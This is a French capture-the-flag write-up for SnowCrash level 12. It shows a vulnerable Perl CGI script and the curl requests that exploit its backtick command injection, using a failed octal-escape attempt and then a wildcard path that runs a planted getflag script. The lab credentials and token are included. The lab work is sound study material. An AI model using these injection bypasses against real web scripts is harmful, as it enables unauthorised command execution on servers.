# LEVEL 12

**LOGIN: level12**

**PASSWORD: fa6v5ateaw21peobuub8ipe6s**

 ----

```
level12@SnowCrash:~$ ls
level12.pl
```

```
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Toujours un exploit subshell à cette ligne : ```@output = `egrep "^$xx" /tmp/xd 2>&1`; ```

Mais `$xx` est mis en majuscule puis tronqué au premier espace: 


Le premier essai consiste à passer une string en octal pour éviter les mofifications

`echo "getflag >/tmp/exploit" > /tmp/1`
```
`curl 192.168.0.15:4646\?x="\`\$'\057\164\155\160\057\061'\`"
```
Il ne se passe pas grand chose, on a accès aux logs
``` 
tail -f /var/log/apache2/error.log

[error] [client 192.168.0.18] sh: 1: 
[error] [client 192.168.0.18] $\\057\\164\\155\\160\\057\\061: not found
```

Arf! le subshell invoqué est `sh`et ne peut pas expand une string octale :((( solution en attente....

Deuxieme technique, on rename le fichier /tmp/1 en /tmp/1111 et on va utiliser un Wildcard pour trouver notre script sans utiliser de lettre : 

`curl 192.168.0.15:4646\?x=/*/1111`

```
cat /tmp/exploit
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

**TOKEN :g1qKMiRpXf53AWhDaU7FEkczr**
